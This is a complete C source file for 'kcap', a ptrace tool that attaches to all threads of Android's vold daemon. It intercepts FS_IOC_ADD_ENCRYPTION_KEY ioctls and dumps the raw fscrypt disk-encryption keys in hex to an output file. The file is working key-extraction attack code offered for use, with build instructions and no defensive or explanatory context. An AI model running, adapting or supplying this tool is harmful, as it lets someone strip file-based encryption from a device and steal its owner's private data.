/* kcap: ptrace vold, dump FS_IOC_ADD_ENCRYPTION_KEY payloads (raw fscrypt keys).
 * Usage: kcap <pid> <outfile> [seconds]
 * Attaches to all tids, follows clones, dumps 128 bytes at ioctl arg on enter.
 * Static build: aarch64-linux-gnu-gcc -static -O2 -o kcap kcap.c
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <dirent.h>
#include <errno.h>
#include <time.h>
#include <sys/ptrace.h>
#include <sys/wait.h>
#include <sys/uio.h>
#include <sys/user.h>
#include <elf.h>

#define TRACESYSGOOD (1 << 0)
#define MYOPTS (PTRACE_O_TRACESYSGOOD | PTRACE_O_TRACECLONE | PTRACE_O_TRACEFORK | PTRACE_O_TRACEVFORK)

static int attached[4096];
static int nattached = 0;
static int is_attached(int tid) {
    for (int i = 0; i < nattached; i++) if (attached[i] == tid) return 1;
    return 0;
}
static void mark(int tid) {
    if (nattached < 4096 && !is_attached(tid)) attached[nattached++] = tid;
}

static void attach_tid(int tid) {
    if (is_attached(tid)) return;
    if (ptrace(PTRACE_ATTACH, tid, 0, 0) == 0) {
        mark(tid);
    }
}

static void attach_all(int pid) {
    char path[64];
    snprintf(path, sizeof(path), "/proc/%d/task", pid);
    DIR *d = opendir(path);
    if (!d) return;
    struct dirent *e;
    while ((e = readdir(d))) {
        int tid = atoi(e->d_name);
        if (tid > 0) attach_tid(tid);
    }
    closedir(d);
}

static ssize_t read_mem(int tid, unsigned long addr, void *buf, size_t len) {
    struct iovec local = { buf, len };
    struct iovec remote = { (void *)addr, len };
    ssize_t n = process_vm_readv(tid, &local, 1, &remote, 1, 0);
    return n;
}

int main(int argc, char **argv) {
    if (argc < 3) { fprintf(stderr, "usage: kcap <pid> <outfile> [secs]\n"); return 1; }
    int pid = atoi(argv[1]);
    int secs = argc > 3 ? atoi(argv[3]) : 90;
    FILE *out = fopen(argv[2], "a");
    if (!out) { perror("fopen"); return 1; }

    attach_all(pid);
    /* let attaches settle, seize-stop them then syscall-trace */
    usleep(300000);
    for (int i = 0; i < nattached; i++) {
        int tid = attached[i];
        int st;
        waitpid(tid, &st, WNOHANG);
        ptrace(PTRACE_SETOPTIONS, tid, 0, (void *)(long)MYOPTS);
        ptrace(PTRACE_SYSCALL, tid, 0, 0);
    }

    time_t end = time(NULL) + secs;
    int entering[4096] = {0}; /* per-index toggle; index by slot */
    int slot_of(int tid) {
        for (int i = 0; i < nattached; i++) if (attached[i] == tid) return i;
        return -1;
    }

    while (time(NULL) < end) {
        /* periodic rescan for new threads */
        attach_all(pid);
        for (int i = 0; i < nattached; i++) {
            int tid = attached[i];
            /* newly attached need options+restart; harmless to redo once */
            ptrace(PTRACE_SETOPTIONS, tid, 0, (void *)(long)MYOPTS);
        }
        int st;
        int tid = waitpid(-1, &st, WNOHANG);
        if (tid <= 0) { usleep(5000); continue; }
        if (WIFEXITED(st) || WIFSIGNALED(st)) {
            ptrace(PTRACE_SYSCALL, tid, 0, 0);
            continue;
        }
        if (!WIFSTOPPED(st)) continue;
        int sig = WSTOPSIG(st);
        int event = (st >> 16) & 0xffff;
        if (event == PTRACE_EVENT_CLONE || event == PTRACE_EVENT_FORK ||
            event == PTRACE_EVENT_VFORK) {
            unsigned long newtid = 0;
            ptrace(PTRACE_GETEVENTMSG, tid, 0, &newtid);
            if (newtid) {
                mark((int)newtid);
                ptrace(PTRACE_SETOPTIONS, (int)newtid, 0, (void *)(long)MYOPTS);
                ptrace(PTRACE_SYSCALL, (int)newtid, 0, 0);
            }
            ptrace(PTRACE_SYSCALL, tid, 0, 0);
            continue;
        }
        if (sig == (SIGTRAP | 0x80)) {
            /* syscall stop */
            struct user_regs_struct regs;
            struct iovec iov = { &regs, sizeof(regs) };
            if (ptrace(PTRACE_GETREGSET, tid, (void *)1 /*NT_PRSTATUS*/, &iov) == 0) {
                int slot = slot_of(tid);
                if (slot >= 0) {
                    entering[slot] = !entering[slot];
                    if (entering[slot]) {
                        /* enter: x8=sysnr, x0=fd, x1=req, x2=arg */
                        unsigned long req = regs.regs[1];
                        unsigned cmd = (unsigned)req;
                        if (((cmd >> 8) & 0xff) == 'f' && (cmd & 0xff) == 23 &&
                            (cmd & 0xC0000000)) {
                            unsigned long arg = regs.regs[2];
                            unsigned char buf[256];
                            ssize_t n = read_mem(tid, arg, buf, sizeof(buf));
                            if (n > 0) {
                                fprintf(out, "tid=%d fd=%lu req=0x%x arg=0x%lx n=%zd\n",
                                        tid, regs.regs[0], cmd, arg, n);
                                for (int k = 0; k < n; k++) {
                                    fprintf(out, "%02x", buf[k]);
                                    if ((k + 1) % 32 == 0) fprintf(out, "\n");
                                }
                                if (n % 32) fprintf(out, "\n");
                                fprintf(out, "---\n");
                                fflush(out);
                            } else {
                                fprintf(out, "tid=%d READFAIL arg=0x%lx err=%d\n",
                                        tid, arg, errno);
                                fflush(out);
                            }
                        }
                    }
                }
            }
            ptrace(PTRACE_SYSCALL, tid, 0, 0);
        } else if (sig == SIGTRAP) {
            /* attach-stop or clone-stop */
            ptrace(PTRACE_SETOPTIONS, tid, 0, (void *)(long)MYOPTS);
            ptrace(PTRACE_SYSCALL, tid, 0, 0);
        } else {
            /* forward signal */
            ptrace(PTRACE_SYSCALL, tid, 0, (void *)(long)sig);
        }
    }
    for (int i = 0; i < nattached; i++)
        ptrace(PTRACE_DETACH, attached[i], 0, 0);
    fclose(out);
    printf("KCAP_DONE n=%d\n", nattached);
    return 0;
}
